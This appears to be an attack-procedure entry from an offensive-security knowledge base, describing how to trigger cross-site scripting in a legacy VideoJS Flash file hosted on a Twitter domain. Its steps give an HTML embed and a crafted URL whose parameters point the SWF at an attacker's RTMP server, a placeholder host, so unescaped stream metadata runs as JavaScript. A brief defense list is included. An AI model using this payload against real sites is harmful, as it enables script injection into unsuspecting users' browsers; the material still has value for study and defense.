---
id: proc-uuid-3
tags:
  - xss
  - flash
  - swf
  - videojs
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
  - Flash
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:15:27.056Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Load-Vulnerable-VideoJS-SWF-with-RTMP-Parameters

## Summary

This procedure loads the vulnerable VideoJS SWF file with specific RTMP connection parameters, triggering it to connect to the malicious stream and read unescaped metadata for XSS execution.

## Description

The VideoJS SWF at https://platform.twitter.com/video/video-js.1e43b81a2f30220a16fd493aaf072451.swf processes RTMP streams by calling ExternalInterface to pass metadata objects to JavaScript without escaping, leading to XSS. Query parameters like eventProxyFunction, autoplay, rtmpStream, and rtmpConnection direct the SWF to the attacker's RTMP server. The attack scenario is embedding this SWF in an HTML page or accessing directly in a Flash-enabled browser; prerequisites include the RTMP server running; expected outcome is metadata ingestion and JS injection.

## Requirements

1. Flash-enabled browser or emulator
2. Running RTMP server from previous procedure
3. Direct URL access to the SWF

## Defense

Defensive measures and detection strategies:

- Remove or update legacy SWF files to escape outputs
- Enforce Flash deprecation and use HTML5 alternatives
- CSP headers to block unsafe inline scripts
- Audit third-party media embeds for parameter validation

## Objectives

1. Initialize SWF with RTMP params to connect to malicious stream
2. Trigger metadata reading via ExternalInterface
3. Bypass HTTP policy file requirements

## Instructions

### Step 1: Prepare HTML Embed

**Context**: Create a simple HTML page to load the SWF if direct access is restricted.

Write HTML:

```html
<object data="https://platform.twitter.com/video/video-js.1e43b81a2f30220a16fd493aaf072451.swf?eventProxyFunction=console.log&autoplay=true&rtmpStream=mp3:haha&rtmpConnection=rtmp://not-a-real-example-rtmp-server.com/" type="application/x-shockwave-flash" width="640" height="480"></object>
```

> Embeds SWF with params. Expected output: SWF loads in browser.

### Step 2: Access and Load

**Context**: Open the URL or HTML to initiate the connection.

Navigate to the SWF URL with params in browser:

https://platform.twitter.com/video/video-js.1e43b81a2f30220a16fd493aaf072451.swf?eventProxyFunction=console.log&autoplay=true&rtmpStream=mp3:haha&rtmpConnection=rtmp://not-a-real-example-rtmp-server.com/

> Directly accesses; monitor dev tools for connection. Expected output: RTMP handshake and metadata fetch.

### Step 3: Monitor Connection

**Context**: Verify SWF connects and reads metadata.

Use browser console to watch for ExternalInterface calls.

**Expected Output**: Logs showing plugin loadedmetadata event with tags object.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[flash]]
- [[swf]]
